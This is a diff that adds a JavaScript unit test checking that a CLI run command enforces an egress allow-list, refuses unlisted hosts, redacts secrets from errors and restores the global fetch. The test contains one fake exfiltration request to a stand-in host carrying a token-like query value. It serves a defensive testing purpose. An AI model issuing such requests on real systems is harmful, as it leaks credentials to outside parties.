@@ -118,6 +118,45 @@ describe('cli/commands/run', () => {
   });
   afterEach(() => removeDir(dataDir));
 
+  it('guards every request of the run against the egress allow-list and restores fetch after it (FR-083)', async () => {
+    const before = globalThis.fetch;
+    const seen = [];
+    const fetch = sinon.stub().callsFake(async (url) => {
+      seen.push(String(url));
+      return new Response('{}', { status: 200 });
+    });
+    const { stages } = fakeStages();
+    stages.collect = {
+      name: 'collect',
+      inputs: [],
+      run: async (ctx) => {
+        await ctx.deps.fetch('https://watchdog.example.org/api/health');
+        expect(globalThis.fetch, 'the global fetch is guarded for the run').to.not.equal(before);
+        await ctx.deps.fetch('https://evil.example.org/exfiltrate?token=glsa_secret');
+        return { projects: 0 };
+      },
+    };
+    const t = base(dataDir, { deps: { stages, fetch } });
+    let error;
+    try {
+      await runCommand(t.args);
+    } catch (e) {
+      error = e;
+    }
+    expect(error).to.be.instanceOf(codes.ExitError);
+    expect(error.code).to.equal(codes.UNAVAILABLE);
+    expect(error.message).to.include('evil.example.org:443');
+    expect(error.message).to.not.include('exfiltrate');
+    expect(seen).to.deep.equal(['https://watchdog.example.org/api/health']);
+    expect(globalThis.fetch).to.equal(before);
+    expect(t.err.text()).to.include('egress.refused');
+    expect(t.err.text()).to.not.include('exfiltrate');
+    expect(t.err.text()).to.not.include('glsa_secret');
+    expect(readRun(dataDir).status).to.equal('failed');
+    expect(t.slackPublisher.postFailureNotice).to.have.been.calledOnce;
+    expect(t.slackPublisher.postFailureNotice.firstCall.args[0].text).to.include('evil.example.org:443');
+  });
+
   it('runs every stage in order and ends published with exit 0', async () => {
     const { stages, calls } = fakeStages();
     const t = base(dataDir, { deps: { stages } });
